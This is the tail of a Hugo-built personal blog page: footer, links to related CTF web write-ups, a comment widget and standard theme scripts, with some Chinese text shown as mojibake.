        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>è°¢è°¢è§‚çœ‹</span>
    </section>
    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">ç›¸å…³æ–‡ç« </h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="">
    <a href="/p/2025-%E8%BD%A9%E8%BE%95ctf/">
        
        

        <div class="article-details">
            <h2 class="article-title">2025-è½©è¾•ctf</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/2024newstar-web/">
        
        

        <div class="article-details">
            <h2 class="article-title">2024newstar-web</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/2025-iscc-%E6%80%BB%E5%86%B3%E8%B5%9Bweb1/">
        
        

        <div class="article-details">
            <h2 class="article-title">2025-iscc-æ€»å†³èµ›web1</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/2023-newstar-web/">
        
        

        <div class="article-details">
            <h2 class="article-title">2023-newstar-web</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/2025-iscc-%E6%A0%A1%E8%B5%9B/">
        
        

        <div class="article-details">
            <h2 class="article-title">2025-iscc-æ ¡èµ›</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    <script src="https://utteranc.es/client.js" 
        repo=""
        issue-term="pathname"
        
        crossorigin="anonymous"
        async
        >
</script>

<style>
    .utterances {
        max-width: unset;
    }
</style>

<script>
    let utterancesLoaded = false;

    function setUtterancesTheme(theme) {
        let utterances = document.querySelector('.utterances iframe');
        if (utterances) {
            utterances.contentWindow.postMessage(
                {
                    type: 'set-theme',
                    theme: `github-${theme}`
                },
                'https://utteranc.es'
            );
        }
    }

    addEventListener('message', event => {
        if (event.origin !== 'https://utteranc.es') return;

        
        utterancesLoaded = true;
        setUtterancesTheme(document.documentElement.dataset.scheme)
    });

    window.addEventListener('onColorSchemeChange', (e) => {
        if (!utterancesLoaded) return;
        setUtterancesTheme(e.detail)
    })
</script>


    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
        2025 luokaihong
    </section>
    
    <section class="powerby">
        ä½¿ç”¨ <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> æ„å»º <br />
        ä¸»é¢˜ <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> ç”± <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> è®¾è®¡
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
